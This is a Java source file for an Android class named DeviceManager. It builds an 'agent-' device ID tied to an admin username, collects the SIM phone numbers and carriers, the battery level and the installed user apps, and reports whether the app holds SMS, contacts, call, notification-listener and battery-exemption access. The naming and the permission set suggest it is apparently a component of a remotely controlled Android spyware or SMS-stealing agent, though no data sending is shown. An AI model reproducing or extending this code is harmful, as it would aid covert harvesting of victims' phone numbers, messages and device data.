package com.topdown.softy.functions.managers;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.topdown.softy.functions.helpers.Prefs;
import com.topdown.softy.functions.utils.Utils;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

public class DeviceManager {

    private final Context context;
    private final Prefs prefs;

    public DeviceManager(Context context) {
        this.context = context;
        prefs = new Prefs(context);
    }

    @SuppressLint("HardwareIds")
    public static String getDeviceID(Context context) {
        return "agent-" + Utils.ADMIN_USERNAME + "-" + Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID) + "-" + context.getPackageName();
    }

    public JSONObject getSystemInfoWithPermissions() throws JSONException {
        JSONObject systemInfo = getSystemInfo();
        systemInfo.put("battery", getBattery());
        systemInfo.put("permissions", getPermissionsStatus());
        return systemInfo;
    }

    public JSONObject getSystemInfo() throws JSONException {
        JSONObject systemInfo = new JSONObject();
        systemInfo.put("deviceName", Utils.getPhoneName());
        systemInfo.put("apiLevel", Build.VERSION.SDK_INT);
        systemInfo.put("installedAt", prefs.getPref("installedAt"));
        systemInfo.put("simInfo", getSimInfo());
        systemInfo.put("version", getVersionCode(context));
        return systemInfo;
    }

    public String getDeviceID() {
        return getDeviceID(context);
    }

    public JSONObject getPermissionsStatus() {
        JSONObject result = new JSONObject();

        String[] candidates = {
                android.Manifest.permission.CALL_PHONE,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.SEND_SMS,
                android.Manifest.permission.RECEIVE_SMS,
                android.Manifest.permission.READ_PHONE_STATE,
                android.Manifest.permission.READ_PHONE_NUMBERS,
        };

        try {

            boolean isNotificationListenerEnabled = isNotificationListenerEnabled();
            boolean isBatteryOptimizationDisabled = isBatteryOptimizationDisabled();

            result.put("Notification Listener", isNotificationListenerEnabled ? "Granted ✅" : "Denied ❌");
            result.put("Battery Ignore", isBatteryOptimizationDisabled ? "Granted ✅" : "Denied ❌");


            for (String permission : candidates) {
                // Human readable short name
                String shortName = permission.substring(permission.lastIndexOf('.') + 1);

                // Grant check
                boolean granted = ContextCompat.checkSelfPermission(context, permission)
                        == PackageManager.PERMISSION_GRANTED;
                String status = granted ? "Granted ✅" : "Denied ❌";

                result.put(shortName, status);
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                result.put("POST NOTIFICATION", ContextCompat.checkSelfPermission(context, Manifest.permission.POST_NOTIFICATIONS)
                        == PackageManager.PERMISSION_GRANTED ? "Granted ✅" : "Denied ❌");
            }
        } catch (Exception ignored) {
        }

        return result;
    }

    public JSONArray getSimDetails() throws JSONException {
        JSONArray simInfo = new JSONArray();
        SubscriptionManager sm = (SubscriptionManager) context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
        if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            List<SubscriptionInfo> subs = sm.getActiveSubscriptionInfoList();
            if (subs != null) {
                for (SubscriptionInfo info : subs) {
                    int slotIndex = info.getSimSlotIndex(); // 0 = SIM1, 1 = SIM2
                    String number = info.getNumber(); // Mobile number (can be null!)
                    String carrierName = info.getCarrierName().toString(); // Airtel, Jio, etc.
                    String displayName = info.getDisplayName().toString();
                    simInfo.put(new JSONObject().put("slotIndex", slotIndex).put("number", number).put("carrierName", carrierName).put("displayName", displayName));
                }
            }
        } else {
            return null;
        }
        return simInfo;
    }

    private JSONObject getSimInfo() throws JSONException {
        JSONObject simInfo = new JSONObject();

        simInfo.put("sim1", "N/A");
        simInfo.put("sim2", "N/A");

        SubscriptionManager sm = (SubscriptionManager) context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
        if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            List<SubscriptionInfo> subs = sm.getActiveSubscriptionInfoList();
            if (subs == null) {
                return simInfo;
            }
            for (SubscriptionInfo info : subs) {
                int slotIndex = info.getSimSlotIndex(); // 0 = SIM1, 1 = SIM2
                String number = info.getNumber(); // Mobile number (can be null!)
                simInfo.put("sim" + (slotIndex + 1), number);
            }
        }
        return simInfo;
    }

    private String getBattery() {
        IntentFilter intentFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = context.registerReceiver(null, intentFilter);

        if (batteryStatus != null) {
            int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);

            float batteryPct = level * 100 / (float) scale;

            return batteryPct + "";
        }
        return "N/A";
    }

    private int getVersionCode(Context context) {
        try {
            PackageInfo pInfo = context.getPackageManager().getPackageInfo(context.getPackageName(), 0);
            return pInfo.versionCode;
        } catch (PackageManager.NameNotFoundException ignored) {
        }
        return -1;
    }

    private boolean isNotificationListenerEnabled() {
        String enabledListeners = Settings.Secure.getString(
                context.getContentResolver(),
                "enabled_notification_listeners"
        );
        return enabledListeners != null && enabledListeners.contains(context.getPackageName());
    }

    private boolean isBatteryOptimizationDisabled() {
        PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
        return pm != null && pm.isIgnoringBatteryOptimizations(context.getPackageName());
    }

    public static JSONArray getAllUserApps(Context ctx) {
        PackageManager pm = ctx.getPackageManager();
        List<ApplicationInfo> apps = pm.getInstalledApplications(0);

        JSONArray arr = new JSONArray();

        for (ApplicationInfo app : apps) {

            // Skip system apps
            if ((app.flags & ApplicationInfo.FLAG_SYSTEM) != 0 ||
                    (app.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0) {
                continue;
            }

            try {
                JSONObject obj = new JSONObject();
                obj.put("name", pm.getApplicationLabel(app).toString());
                obj.put("packageName", app.packageName);
                arr.put(obj);
            } catch (Exception ignored) {
            }
        }

        return arr;
    }

}
